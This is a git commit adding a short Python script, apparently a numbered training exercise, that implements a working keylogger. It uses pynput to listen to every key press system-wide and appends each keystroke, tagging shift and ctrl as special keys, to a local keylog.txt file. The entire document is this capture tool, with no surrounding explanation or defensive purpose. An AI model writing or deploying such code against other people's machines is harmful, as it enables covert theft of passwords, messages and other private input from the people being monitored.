c40d6a2b437d6f1ad9aab97f5e03618c9385039f
MrRishabhTiwari <146667919+MrRishabhTiwari@users.noreply.github.com>
2024-05-14 16:52:09 +0530

    Add files via upload

---
+++ Prodigy_CS_04.py
@@ -0,0 +1,20 @@
+from pynput import keyboard
+special_keys = ['Key.shift', 'Key.shift_r', 'Key.ctrl', 'Key.ctrl_l', 'Key.ctrl_r']
+
+def on_press(key):
+    try:
+# Check if the pressed key is a special key
+        if str(key) in special_keys:
+            with open("keylog.txt", "a") as f:
+                f.write(f"[Special Key: {key}]\n")
+        else:
+            with open("keylog.txt", "a") as f:
+                f.write(f"{key}\n")
+    except AttributeError:
+# Handle special keys like 'Shift', 'Ctrl', etc.
+        with open("keylog.txt", "a") as f:
+            f.write(f"[Special Key: {key}]\n")
+
+# Start listening for key presses
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
